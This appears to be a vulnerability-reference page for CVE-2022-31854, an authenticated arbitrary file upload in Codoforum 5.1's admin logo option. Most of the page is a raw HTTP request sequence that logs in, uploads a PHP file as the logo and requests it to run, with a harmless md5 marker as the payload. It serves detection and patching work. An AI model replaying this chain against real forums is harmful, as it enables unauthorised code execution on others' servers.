---
layout: post
cve_id: CVE-2022-31854
title: Codoforum 5.1 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2022/CVE-2022-31854.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-31854.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: high
impact: 'Successful exploitation of this vulnerability can result in unauthorized
  remote code execution on the affected system.

  '
remediation: 'Apply the latest security patch or upgrade to a patched version of Codoforum.

  '
reference:
- https://bitbucket.org/evnix/codoforum_downloads/downloads/codoforum.v.5.1.zip
- https://codoforum.com
- https://vikaran101.medium.com/codoforum-v5-1-authenticated-rce-my-first-cve-f49e19b8bc
- https://nvd.nist.gov/vuln/detail/CVE-2022-31854
- https://github.com/trhacknon/Pocingit
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 7.2
  cve-id: CVE-2022-31854
  cwe-id: CWE-434
  epss-score: 0.85495
  epss-percentile: 0.99336
  cpe: cpe:2.3:a:codologic:codoforum:5.1:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 4
  vendor: codologic
  product: codoforum
tags:
- cve
- cve2022
- rce
- codoforumrce
- authenticated
- intrusive
- codologic
- vuln
---

## üîç Vulnerability Description
Codoforum 5.1 contains an arbitrary file upload vulnerability via the logo change option in the admin panel. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code. As a result, an attacker can potentially obtain sensitive information, modify data, and/or execute unauthorized operations.


## üåê HTTP Request
```nohighlight
POST /admin/?page=login HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 246
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryACGPpj7UIqmtLNbB
Accept-Encoding: gzip
------WebKitFormBoundaryACGPpj7UIqmtLNbB
Content-Disposition: form-data; name="username"
JmYV9w
------WebKitFormBoundaryACGPpj7UIqmtLNbB
Content-Disposition: form-data; name="password"
xGbUsm
------WebKitFormBoundaryACGPpj7UIqmtLNbB--
```

```nohighlight
GET /admin/index.php?page=config HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /admin/index.php?page=config HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Connection: close
Content-Length: 467
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoLtdjuqj2ixPvBhA
Accept-Encoding: gzip
------WebKitFormBoundaryoLtdjuqj2ixPvBhA
Content-Disposition: form-data; name="site_title"
------WebKitFormBoundaryoLtdjuqj2ixPvBhA
Content-Disposition: form-data; name="forum_logo"; filename="38Bk28qx1G9opDagj3BnUQKz3oN.php"
Content-Type:  application/x-httpd-php
<?php
echo md5('CVE-2022-31854');
?>
------WebKitFormBoundaryoLtdjuqj2ixPvBhA
Content-Disposition: form-data; name="CSRF_token"
diLI8R
------WebKitFormBoundaryoLtdjuqj2ixPvBhA--
```

```nohighlight
GET /sites/default/assets/img/attachments/38Bk28qx1G9opDagj3BnUQKz3oN.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Connection: close
Accept-Encoding: gzip
```

